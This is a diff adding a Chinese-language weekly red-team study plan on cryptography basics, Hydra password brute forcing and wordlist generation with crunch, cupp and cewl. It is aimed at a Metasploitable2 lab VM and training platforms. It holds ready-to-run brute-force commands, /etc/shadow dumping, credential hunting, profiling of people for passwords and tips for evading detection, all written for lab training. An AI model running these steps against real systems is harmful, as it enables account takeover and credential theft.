@@ -1,0 +1,541 @@
+================================================================================
+第18周：密码学与凭证攻击 (凭据攻击期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+以"从密码学原理到实际凭证暴力破解"为贯穿案例，学员首先掌握密码学核心概念
+（哈希、加密、编码的区别），理解密码存储机制后，深入学习Hydra在线爆破工具
+和字典生成技术(crunch/cupp/cewl)。最终对Metasploitable2的SSH/FTP等服务完成
+完整的在线密码爆破实战。本阶段属于"凭据攻击期"，凭证获取是红队横向移动的基础。
+
+【本周学习目标】
+1. 理解密码学核心概念：编码vs哈希vs加密、对称vs非对称、哈希碰撞与彩虹表
+2. 掌握常见哈希算法：MD5, SHA1, SHA256, SHA512, bcrypt, NTLM, LM
+3. 掌握常见编码：Base64, Base32, Hex, URL编码, ASCII
+4. 理解加密算法：AES, DES, 3DES, RSA, ECC
+5. 熟练掌握Hydra对多种协议的在线爆破：SSH, FTP, HTTP, MySQL, RDP等
+6. 掌握Hydra高级选项：任务恢复、代理使用、自定义模块
+7. 掌握字典生成三大工具：
+   - crunch：自定义字符集字典生成
+   - cupp (Common User Passwords Profiler)：基于目标信息的字典生成
+   - cewl：从目标网站爬取关键词生成字典
+8. 能够独立完成对目标服务的完整凭证爆破攻击链
+
+【本周知识清单】
+★ 密码学核心概念
+  - 编码(Encoding)：可逆的数据格式转换，非安全机制
+    * Base64, Base32, Hex, URL Encoding, ASCII
+    * Hex Encode (十六进制)：0-9A-F，1字节=2个十六进制字符
+  - 哈希(Hashing)：单向不可逆的固定长度输出
+    * 安全用途：密码存储、数据完整性校验、数字签名
+    * 常见算法：MD5(128bit), SHA1(160bit), SHA256(256bit), SHA512(512bit)
+    * Windows凭证哈希：NTLM, LM Hash, Net-NTLMv1/v2
+    * Linux凭证哈希：$1$(MD5), $5$(SHA256), $6$(SHA512), $y$(yescrypt)
+    * bcrypt, scrypt, argon2 (抗GPU/ASIC的密码哈希算法)
+    * 哈希攻击：字典攻击(dictionary)、彩虹表(rainbow table)、暴力破解(brute force)
+    * 加盐(Salt)：随机字符串附加到密码前/后进行哈希，防彩虹表
+  - 加密(Encryption)：可逆的密钥保护数据
+    * 对称加密(Symmetric)：AES, DES, 3DES, Blowfish - 同一密钥加解密
+    * 非对称加密(Asymmetric)：RSA, ECC, ElGamal - 公钥加密/私钥解密
+    * 混合加密：TLS/SSL采用混合模式（非对称交换对称密钥）
+  - 编码/哈希/加密对比表
+  - Base64识别特征：字符集[A-Za-z0-9+/=]，末尾常有==
+  - 哈希识别：hash-identifier, hashid, hash-analyzer
+
+★ Hydra在线爆破
+  - Hydra概述：世界上最快的在线密码破解工具
+  - 支持协议：SSH, FTP, HTTP-GET, HTTP-POST, HTTPS, SMB, MySQL, 
+    PostgreSQL, RDP, VNC, Telnet, SNMP, IMAP, POP3, SMTP, LDAP等
+  - 核心参数：
+    * -l LOGIN：单个用户名
+    * -L FILE：用户名字典文件
+    * -p PASS：单个密码
+    * -P FILE：密码字典文件
+    * -t TASKS：并发任务数（默认16）
+    * -f：找到第一个有效密码后退出
+    * -o FILE：输出结果到文件
+    * -vV：详细输出模式
+    * -R：恢复之前中断的任务
+    * -x min:max:charset：暴力生成密码（无字典）
+    * -e nsr：额外测试 null/same as login/reverse login
+  - 协议特定选项：
+    * HTTP-POST：/login.php:user=^USER^&pass=^PASS^:Login Failed
+    * SSH：ssh://IP (默认端口22)
+    * FTP：ftp://IP (默认端口21)
+    * MySQL：mysql://IP
+    * SMB：smb://IP
+  - 爆破优化：
+    * 控制并发数(-t)避免触发账户锁定
+    * 添加延迟(-W)减少被检测风险
+    * SSH爆破建议降到4线程（协议限制）
+    * HTTP爆破注意Cookie和CSRF Token
+
+★ 字典生成技术
+  - crunch：基于字符集和模式的自定义字典生成
+    * crunch <min> <max> [charset] -o output.txt
+    * 模式：@ 小写, , 大写, % 数字, ^ 特殊字符
+    * 示例：crunch 6 8 abc123 -o dict.txt (6-8位由abc123组成的密码)
+    * 字符集文件：/usr/share/crunch/charset.lst
+    * 管道输出配合其他工具：crunch 4 6 0123456789 | aircrack-ng
+  - cupp (Common User Passwords Profiler)：
+    * 基于目标个人信息生成定制字典
+    * 交互式问答：姓名、昵称、生日、宠物、伴侣、子女、公司等
+    * 自动组合和变形：大小写、leet替换、年份后缀、符号后缀
+    * python3 cupp.py -i (交互模式)
+  - cewl (Custom Word List generator)：
+    * 从网站爬取内容生成关键词字典
+    * cewl http://target.com -w output.txt -d 2 -m 5
+    * -d：爬取深度, -m：最小单词长度, -w：输出文件
+    * --with-numbers：包含数字
+    * --lowercase / --uppercase：大小写转换
+    * --email / --meta：提取邮箱和元数据
+
+【本周工具清单】
+  - Hydra (thc-hydra在线爆破)
+  - crunch (字典生成)
+  - cupp (社会工程字典)
+  - cewl (网站关键词字典)
+  - hash-identifier / hashid (哈希识别)
+  - Metasploitable2 (靶机)
+  - rockyou.txt (经典密码字典)
+
+================================================================================
+周一：密码学核心概念
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：密码学核心概念：编码、哈希、加密的区别和各自应用场景
+  - 信息安全三要素(CIA Triad)：机密性、完整性、可用性
+  - 编码(Encoding)：
+    * 目的：数据格式转换，非安全机制
+    * Base64：每3字节转换为4个可打印字符，识别特征[A-Za-z0-9+/=]
+    * Base32：每5字节转换为8个字符
+    * Hex：每字节转换为2个十六进制字符[0-9A-F]
+    * URL编码：%后跟两位十六进制
+  - 哈希(Hashing)：
+    * 特性：单向不可逆、固定长度输出、雪崩效应、抗碰撞
+    * MD5(128bit/32hex)：已被破解，不应用于安全目的
+    * SHA家族：SHA1(160bit/40hex)->已不安全, SHA256(64hex), SHA512(128hex)
+    * Linux口令哈希格式：$id$salt$hash
+      $1$ = MD5, $5$ = SHA256, $6$ = SHA512, $y$ = yescrypt
+    * Windows NTLM格式：32位十六进制大写
+    * bcrypt格式：$2a$或$2b$开头，包含cost factor和salt
+    * 加盐(Salt)防彩虹表：随机salt使相同密码产生不同哈希
+  - 加密(Encryption)：
+    * 对称加密：AES-128/192/256, DES(已过时), 3DES, ChaCha20
+    * 非对称加密：RSA(1024-4096位), ECC(256位可媲美RSA-3072), Ed25519
+    * 混合加密：TLS使用非对称交换对称密钥，对称加密传输数据
+  参考文件：/home/a/成长为一个红队/网安基础知识/04-密码学基础.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：密码学基础操作实践：编码/解码、哈希计算、hash识别
+  参考文件：/home/a/成长为一个红队/网安基础知识/04-密码学基础.txt
+
+  操作步骤：
+    Step 1: Base64编码解码练习:
+      echo -n "hello world" | base64 -> aGVsbG8gd29ybGQ=
+      echo -n "aGVsbG8gd29ybGQ=" | base64 -d -> hello world
+    Step 2: 对密码进行Base64编码，观察是否安全（不正确，因为可逆）
+      echo -n "admin123" | base64 -> YWRtaW4xMjM=
+      echo -n "YWRtaW4xMjM=" | base64 -d -> admin123 (完全可逆！)
+    Step 3: Hex编码解码:
+      echo -n "hello" | xxd -p -> 68656c6c6f
+      echo -n "68656c6c6f" | xxd -r -p -> hello
+    Step 4: 计算各种哈希值:
+      echo -n "password" | md5sum -> 5f4dcc3b5aa765d61d8327deb882cf99
+      echo -n "password" | sha1sum -> 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
+      echo -n "password" | sha256sum
+      echo -n "password" | sha512sum
+    Step 5: 使用hash-identifier识别哈希类型:
+      hash-identifier 或 hashid
+      输入: 5f4dcc3b5aa765d61d8327deb882cf99 -> 识别为MD5
+      输入: $6$salt$hashvalue... -> 识别为SHA-512 Crypt
+      输入: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 -> 识别为SHA1
+    Step 6: 使用Python进行密码学操作:
+      python3 -c "import hashlib; print(hashlib.md5(b'password').hexdigest())"
+      python3 -c "import base64; print(base64.b64encode(b'admin'))"
+      python3 -c "import hashlib; print(hashlib.sha256(b'test').hexdigest())"
+    Step 7: 观察加盐(Salt)的效果:
+      密码password, salt1: echo -n "salt1password" | md5sum
+      密码password, salt2: echo -n "salt2password" | md5sum
+      对比两次哈希值完全不同（雪的效应+不同salt）
+    Step 8: 识别Linux /etc/shadow中的哈希格式:
+      sudo cat /etc/shadow | grep "$"
+      识别$6$(SHA512), $1$(MD5), $y$(yescrypt)等格式
+    Step 9: openssl加密操作:
+      echo "hello" | openssl enc -aes-256-cbc -a -pbkdf2 -pass pass:secretkey
+      echo "encrypted_base64" | openssl enc -d -aes-256-cbc -a -pbkdf2 -pass pass:secretkey
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周二：哈希与加密实践
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：密码学在红队渗透中的实际应用场景
+  - 渗透测试中的密码学应用：
+    1. 密码哈希破解：获取hash -> 识别类型 -> 破解 -> 获取明文密码
+    2. 加密数据解密：获取加密文件/通信 -> 识别加密算法 -> 破解或提取密钥
+    3. 散列漏洞利用：哈希长度扩展攻击(Hash Length Extension)
+    4. HMAC/JWT密钥攻击：弱HMAC密钥导致的JWT伪造
+    5. 数字证书攻击：SSL/TLS证书伪造和中间人
+    6. 随机数预测：弱PRNG导致的Token/Session ID可预测
+  - 哈希破解的攻击链：
+    获取hash源 -> hash识别 -> 选择攻击方式 -> 执行破解 -> 密码复用
+    * 获取hash源：/etc/shadow、SAM文件、数据库、内存转储、网络嗅探
+    * hash识别：hashid, hash-identifier, 手工识别格式
+    * 攻击方式选择：字典攻击/规则攻击/掩码攻击/暴力破解（取决于hash复杂度）
+    * 密码复用：用一个系统的密码尝试其他系统
+  - 常见凭证位置：
+    * Linux: /etc/shadow, /etc/passwd, ~/.ssh/id_rsa, ~/.bash_history
+    * Windows: SAM, NTDS.dit, LSASS内存, 浏览器保存密码, RDP凭据
+    * Web: config.php, wp-config.php, .env, application.properties, 数据库
+    * 版本控制：.git/config, .git/logs/HEAD (泄露的credentials)
+  - OpenSSL工具集：
+    * 加密/解密：openssl enc
+    * 密钥生成：openssl genrsa, openssl ecparam
+    * 证书操作：openssl x509, openssl req
+    * 哈希计算：openssl dgst
+    * Base64编解码：openssl base64
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：OpenSSL密码学操作、凭证定位和哈希破解准备
+  操作步骤：
+    Step 1: OpenSSL对称加密和解密:
+      加密: echo "Secret Message" | openssl enc -aes-256-cbc -a -pbkdf2 -pass pass:mypassword -out encrypted.txt
+      解密: cat encrypted.txt | openssl enc -d -aes-256-cbc -a -pbkdf2 -pass pass:mypassword
+    Step 2: OpenSSL生成RSA密钥对:
+      openssl genrsa -out private.pem 2048 (生成2048位RSA私钥)
+      openssl rsa -in private.pem -pubout -out public.pem (提取公钥)
+      cat private.pem (查看私钥内容)
+    Step 3: OpenSSL进行文件哈希:
+      openssl dgst -sha256 file.txt
+      openssl dgst -md5 file.txt
+      openssl dgst -sha512 file.txt
+    Step 4: 在Metasploitable2上识别密码存储:
+      (通过之前的Shell) cat /etc/shadow
+      识别哈希类型: $1$(MD5)或$6$(SHA512)
+    Step 5: 将Metasploitable2的shadow导出:
+      cat /etc/shadow | grep -v "*" | grep -v "!" > ms2_shadow.txt
+    Step 6: hash-identifier 分析shadow中的哈希
+    Step 7: 准备用于Hashcat破解的文件:
+      cat /etc/passwd > ms2_passwd.txt
+      cat /etc/shadow > ms2_shadow.txt
+    Step 8: 使用unshadow合并文件:
+      unshadow ms2_passwd.txt ms2_shadow.txt > ms2_combined.txt
+    Step 9: 探索Metasploitable2上的密码相关文件:
+      cat /etc/passwd
+      cat /etc/group
+      ls -la /home/*/ .ssh/ (查找SSH密钥)
+    Step 10: 查找明文密码:
+      grep -r "password" /var/www/html/ 2>/dev/null | head -20
+      find /var/www -name "config*" -exec cat {} \; 2>/dev/null
+    Step 11: 检查数据库中的凭证:
+      mysql -u root -e "SELECT User,Password FROM mysql.user;" (如有权限)
+    Step 12: 整理收集到的所有凭证和哈希，为后续破解做准备
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周三：Hydra在线爆破完整学习
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Hydra架构、所有协议选项和爆破策略
+  - Hydra工作原理：
+    * 多线程同时尝试多个用户名:密码组合
+    * 每个线程建立一次连接，发送认证请求
+    * 根据服务响应判断认证成功/失败
+    * 记录成功的凭据
+  - 完整命令语法：
+    hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr]
+    [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT]
+    [-x MIN:MAX:CHARSET] [-SuvV46] [service://server[:PORT][/OPT]]
+  - 支持的全部协议（常用）及用法：
+    * ssh：hydra -l admin -P pass.txt ssh://192.168.1.1
+    * ftp：hydra -l admin -P pass.txt ftp://192.168.1.1
+    * http-get：hydra -l admin -P pass.txt 192.168.1.1 http-get /protected/
+    * http-post-form：hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"
+    * https-post-form：同上但使用HTTPS
+    * mysql：hydra -l root -P pass.txt mysql://192.168.1.1
+    * postgresql：hydra -l postgres -P pass.txt postgresql://192.168.1.1
+    * rdp：hydra -l admin -P pass.txt rdp://192.168.1.1
+    * smb：hydra -l admin -P pass.txt smb://192.168.1.1
+    * telnet：hydra -l root -P pass.txt telnet://192.168.1.1
+    * vnc：hydra -P pass.txt vnc://192.168.1.1
+  - 爆破策略中的伦理和速度控制：
+    * -t 4-8 (SSH), -t 16-32 (HTTP/FTP)
+    * -w TIME：响应等待时间
+    * -W TIME：连接间隔延迟
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/05-密码攻击与破解技术.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：Hydra对多种协议进行在线爆破练习
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/05-密码攻击与破解技术.txt
+  + /home/a/成长为一个红队/archstrike-cracking教学/01-在线密码攻击大师课.txt
+
+  操作步骤：
+    Step 1: sudo apt install hydra 安装Hydra（如未安装）
+    Step 2: hydra -h 查看帮助信息
+    Step 3: hydra -U 查看所有支持协议
+    Step 4: 准备字典文件:
+      创建users.txt (msfadmin, root, user, admin, guest)
+      使用rockyou.txt: ls /usr/share/wordlists/rockyou.txt.gz
+      解压: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+    Step 5: 对Metasploitable2进行SSH爆破:
+      hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101 -t 4 -vV
+    Step 6: 对Metasploitable2进行FTP爆破:
+      hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101 -t 8 -vV
+    Step 7: 对Metasploitable2进行Telnet爆破:
+      hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.56.101 -t 4
+    Step 8: 对Metasploitable2进行MySQL爆破:
+      hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.56.101 -t 8
+    Step 9: 对Metasploitable2进行SMB爆破:
+      hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://192.168.56.101 -t 4
+    Step 10: 对DVWA进行HTTP-POST爆破:
+      使用Burp抓取DVWA登录请求格式
+      hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 16
+    Step 11: 测试IP范围爆破:
+      hydra -l root -p toor -M targets.txt ssh (targets.txt包含多个IP)
+    Step 12: 使用-e选项测试空密码和相同密码:
+      hydra -l admin -P pass.txt -e nsr ssh://192.168.56.101
+    Step 13: 将结果保存到文件:
+      hydra -l msfadmin -P rockyou.txt -o hydra_ssh_results.txt ssh://192.168.56.101
+    Step 14: 模拟任务中断->恢复:
+      Ctrl+C 中断Hydra, 使用 hydra -R 恢复之前的任务
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周四：字典生成 (crunch, cupp, cewl)
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：三种字典生成工具的原理、使用场景和组合策略
+  - 字典攻击在渗透测试中的重要性：
+    * 弱密码是最常见的安全漏洞之一
+    * 字典质量决定爆破成功率
+    * 优秀的字典应该：专为目标定制 + 涵盖常见密码模式
+  - crunch：基于字符集的字典生成
+    * 适用场景：知道密码策略（长度、字符集要求）
+    * 模式语法：@=小写, ,=大写, %=数字, ^=特殊字符
+    * 示例：crunch 8 8 -t Pass@@@@ -o dict.txt (Pass+4位小写)
+    * 示例：crunch 6 8 abc123 -o dict.txt (abc123字符集,长度6-8)
+    * 管道输出：crunch 4 6 0123456789 | hydra -l admin -P - ssh://target
+    * 注意：crunch可能生成海量字典，需合理设置参数
+  - cupp (Common User Passwords Profiler)：
+    * 适用场景：知道目标的个人信息（社工）
+    * 交互式输入基本信息 -> 自动生成可能的密码组合
+    * 变形规则：大小写变换、leet替换(a=4/@, e=3, i=1, o=0, s=5/$)
+    * 特殊日期：生日、纪念日、年份
+    * 关键字组合：姓名+昵称+宠物+爱好+特殊数字
+    * 最佳实践：先通过OSINT收集目标信息 -> cupp生成 -> 再结合crunch
+  - cewl (Custom Word List generator)：
+    * 适用场景：目标是企业/组织网站
+    * 从网站爬取所有文本内容 -> 提取关键词
+    * 公司名称、产品名称、员工姓名、行业术语 -> 都是潜在密码
+    * cewl http://target.com -d 2 -m 5 -w target_words.txt
+    * --with-numbers：追加数字后缀
+    * --email：提取发现的邮箱地址
+    * 最佳实践：cewl -> 关键词 -> cupp -> 定制字典
+  参考文件：/home/a/成长为一个红队/archstrike-cracking教学/03-字典生成与密码分析.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：使用crunch/cupp/cewl生成不同场景的字典
+  参考文件：/home/a/成长为一个红队/archstrike-cracking教学/03-字典生成与密码分析.txt
+
+  操作步骤：
+    Step 1: sudo apt install crunch cewl 安装工具
+    Step 2: git clone https://github.com/Mebus/cupp 获取cupp
+    Step 3: crunch基础使用:
+      crunch 4 6 0123456789 -o /tmp/numeric_dict.txt (纯数字4-6位)
+      wc -l /tmp/numeric_dict.txt (查看字典条目数)
+    Step 4: crunch模式使用:
+      crunch 8 8 -t admin@@@ -o /tmp/admin_dict.txt
+      crunch 6 6 -t ,@@%%% -o /tmp/pattern_dict.txt
+    Step 5: crunch限定字符集:
+      crunch 4 8 abcdefghijklmnopqrstuvwxyz0123456789 -o /tmp/alphanum_dict.txt
+    Step 6: crunch管道输出（不生成文件，直接暴力）:
+      crunch 3 4 abc123 | head -20
+    Step 7: cupp 交互式字典生成:
+      cd cupp && python3 cupp.py -i
+      依次输入：First Name, Surname, Nickname, Birthdate
+      Partner's name, Pet's name, Company name
+      输入 kids names, other keywords
+      选择是否添加leet替换、特殊字符
+      cupp会自动在生成目标名字的目录下保存字典
+    Step 8: 查看cupp生成的字典内容:
+      ls cupp_output/
+      cat cupp_output/target_name.txt | head -50
+    Step 9: cewl爬取目标网站生成关键词:
+      cewl http://192.168.56.101 -d 1 -m 4 -w /tmp/ms2_words.txt
+    Step 10: cewl深度爬取:
+      cewl http://192.168.56.101/mutillidae -d 2 -m 3 -w /tmp/mutillidae_words.txt
+    Step 11: cewl提取邮箱:
+      cewl http://192.168.56.101 --email -e -d 2 -m 3
+    Step 12: cewl生成带数字的字典:
+      cewl http://192.168.56.101 -d 1 -m 4 --with-numbers -w /tmp/ms2_words_num.txt
+    Step 13: 组合使用三种工具:
+      cewl爬取关键词 -> 关键词作为cupp的Other Keywords输入
+      cupp生成社工字典 -> crunch生成数字组合字典
+      合并: cat dict1.txt dict2.txt | sort -u > final_dict.txt
+    Step 14: 使用生成的字典对Metasploitable2进行Hydra爆破测试
+      hydra -l msfadmin -P final_dict.txt ssh://192.168.56.101 -t 4
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周五：对Metasploitable2的SSH/FTP做完整密码爆破
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：在线密码爆破实战策略和结果分析
+  - 完整凭证攻击链回顾：
+    信息收集(OSINT) -> 字典生成(cupp/cewl/crunch) -> 协议识别(nmap) -> 
+    Hydra爆破 -> 凭据验证 -> 后续利用(SSH登录/横向移动)
+  - SSH爆破注意事项：
+    * SSH有连接速率限制(默认MaxStartups 10:30:60)
+    * 建议-t 4（4线程）避免触发速率限制和账户锁定
+    * OpenSSH > 6.8可能支持多个认证尝试，但仍有timeout
+    * 密钥认证优先于密码认证
+    * 发现密钥文件(id_rsa/id_dsa)时可尝试密钥破解
+  - FTP爆破注意事项：
+    * FTP通常对爆破不太敏感（不像SSH）-> 可提高-t到16-32
+    * 匿名登录(Anonymous FTP)：用户名anonymous/ftp，密码任意
+    * vsftpd 2.3.4后门（Metasploitable2）-> 可通过Exploit绕过
+    * FTP爆破可能产生大量日志
+  - 爆破结果分析：
+    * 成功凭据：记录并分类优先级
+    * 账户锁定：降低-t、添加延迟
+    * 速率限制：添加-W延迟、使用代理轮换
+    * 假阳性：某些服务总是返回相似响应
+  - 爆破后行动：
+    * SSH登录 -> 获取shell -> 信息收集 -> 提权
+    * FTP登录 -> 浏览文件 -> 下载敏感文件 -> 上传payload
+    * 密码复用到其他服务：Web面板、数据库、邮箱
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：对Metasploitable2的SSH和FTP执行完整的密码爆破攻击链
+  操作步骤：
+    Step 1: 启动Metasploitable2虚拟机，确认网络连通
+    Step 2: nmap -sV -sC -p 21,22,23 192.168.56.101 确认SSH/FTP/Telnet服务
+    Step 3: Step 1: 对SSH的完整爆破:
+      hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101 -t 4 -vV -o hydra_ssh_full.txt
+    Step 4: 观察Hydra输出，记录成功凭据和尝试速度
+    Step 5: Step 2: 对FTP的完整爆破:
+      hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101 -t 16 -vV -o hydra_ftp_full.txt
+    Step 6: Step 3: 查看爆破结果:
+      cat hydra_ssh_full.txt
+      cat hydra_ftp_full.txt
+    Step 7: Step 4: 使用发现的凭据登录SSH:
+      ssh msfadmin@192.168.56.101
+      验证凭据有效性
+    Step 8: Step 5: 在SSH会话中进行后渗透信息收集:
+      whoami; id
+      uname -a; cat /etc/issue
+      ls -la /home
+      cat /etc/passwd; sudo cat /etc/shadow (如果msfadmin有sudo权限)
+      cat /home/msfadmin/.bash_history
+      ls -la /home/msfadmin/.ssh/
+      sudo -l (检查sudo权限)
+    Step 9: Step 6: 收集更多凭证:
+      cat /etc/shadow > /tmp/shadow_dump
+      cat /etc/passwd > /tmp/passwd_dump
+      find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | xargs grep -l "password" 2>/dev/null
+    Step 10: Step 7: 使用FTP凭据登录:
+      ftp 192.168.56.101
+      输入用户名密码
+      ls -la
+      cd /home; ls -la
+      get /etc/passwd /tmp/ftp_passwd.txt (如果权限允许)
+    Step 11: Step 8: 使用Telnet凭据登录:
+      telnet 192.168.56.101
+      输入用户名密码
+    Step 12: Step 9: 尝试相同的凭据对其他服务进行测试:
+      MySQL: mysql -h 192.168.56.101 -u msfadmin -p
+      PostgreSQL: psql -h 192.168.56.101 -U msfadmin
+    Step 13: 整理所有发现的凭据清单，标注哪些已验证有效
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📝 第1小时 | 周知识点回顾 (08:00 - 09:00)
+  复习清单：
+  - 密码学核心：编码(可逆) vs 哈希(不可逆) vs 加密(可逆需密钥)
+  - 常见哈希识别：MD5(32hex), SHA1(40hex), SHA256(64hex), SHA512(128hex)
+  - Linux: $1$(MD5), $6$(SHA512), NTLM: 32hex大写
+  - Hydra命令模板：hydra -l/-L user -p/-P pass service://IP -t N -vV -o out
+  - 字典生成三种场景：crunch(已知策略)、cupp(已知个人)、cewl(已知网站)
+  - 爆破后行动：凭证验证 -> 登录 -> 信息收集 -> 密码复用 -> 横向移动
+
+💻 第2小时 | 综合实战练习 (09:00 - 10:00)
+  练习内容：不参考笔记，独立完成一个完整的凭证攻击链
+  操作步骤：
+    Step 1: 选择目标（Metasploitable2 或 HTB靶机）
+    Step 2: 信息收集 -> 识别认证服务
+    Step 3: 生成定制字典（cewl网站 + cupp社工 + crunch自定义）
+    Step 4: Hydra爆破多种服务
+    Step 5: 验证凭据，尝试登录
+    Step 6: 收集更多凭证和敏感信息
+
+🔓 第3小时 | HackTheBox / TryHackMe 密码攻击 (10:00 - 11:00)
+  练习内容：在在线平台上练习密码破解和凭证攻击
+  操作步骤：
+    Step 1: 连接HTB VPN或访问THM
+    Step 2: 在THM中搜索"Hydra"或"Password Attacks"房间
+    Step 3: 尝试HTB中需要密码爆破的靶机（如"Lame"的SMB爆破）
+    Step 4: 练习使用多种字典策略
+    Step 5: 记录有效的攻击路径
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/网安基础知识/04-密码学基础.txt
+  /home/a/成长为一个红队/archstrike-base教学/05-密码攻击与破解技术.txt
+  /home/a/成长为一个红队/archstrike-cracking教学/01-在线密码攻击大师课.txt
+  /home/a/成长为一个红队/archstrike-cracking教学/03-字典生成与密码分析.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-base教学/05-密码攻击与破解技术.txt
+  /home/a/成长为一个红队/archstrike-cracking教学/01-在线密码攻击大师课.txt
+  /home/a/成长为一个红队/archstrike-cracking教学/03-字典生成与密码分析.txt
+
+在线练习：
+  - Metasploitable2 SSH/FTP/Telnet (192.168.56.101)
+  - HackTheBox (https://app.hackthebox.com)
+  - TryHackMe密码攻击房间 (https://tryhackme.com)
+  - CrackStation (https://crackstation.net - 在线哈希查询)
+
+推荐工具安装：
+  - Hydra (sudo apt install hydra)
+  - crunch (sudo apt install crunch)
+  - cewl (sudo apt install cewl)
+  - cupp (git clone https://github.com/Mebus/cupp)
+  - hash-identifier / hashid (sudo apt install hashid)
+  - rockyou.txt (sudo apt install wordlists)
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
